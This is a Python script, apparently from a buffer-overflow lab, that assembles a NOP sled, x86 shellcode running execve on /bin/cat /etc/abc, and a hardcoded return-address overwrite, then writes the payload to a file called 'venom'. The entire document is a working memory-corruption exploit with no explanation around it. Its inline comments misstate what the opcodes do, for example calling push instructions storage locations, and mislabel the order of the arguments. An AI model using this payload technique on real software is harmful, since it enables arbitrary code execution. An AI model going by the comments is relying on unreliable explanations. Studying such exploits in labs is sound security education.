#!/usr/bin/python3
import sys

riskcode= (
	"\x31\xc0"     # xor to write 0 in eax
	"\x50"         # storing the eax in 50
	"\x68""/abc"	# writing abc in x 68
	"\x68""/etc"	#writing etc in x 68
	"\x89\xe2"     #we gave the string and store in 52
	"\x50"
  "\x68""/cat"		# we store cat in 68
  "\x68""/bin"		# we store bin in 68
	"\x89\xe3"		# we store the string in 53
  "\x50"			# an array is formed with null being the third argument
  "\x52"			# etc/abc being the sceond argumnet
  "\x53"			# bin/cat being 3rd argument
	"\x89\xe1"		# we store the string in xe1
	"\x31\xd2"		# to generate 0
	"\xb0\x0b"		# command to have system call 11 as that is required for execve
	"\xcd\x80"
).encode('latin-1')

content = bytearray(0x90 for i in range(300))
print(len(riskcode))
start = 300 -len(riskcode)
content[start:] = riskcode
# ebp    = 0xbfffec28
# buffer = 0xbfffec08
# diff   = 32
ret = 0xbfffec28 + 100
content[36:40] = ret.to_bytes(4,byteorder='little')

with open('venom','wb') as f:
	f.write(content)
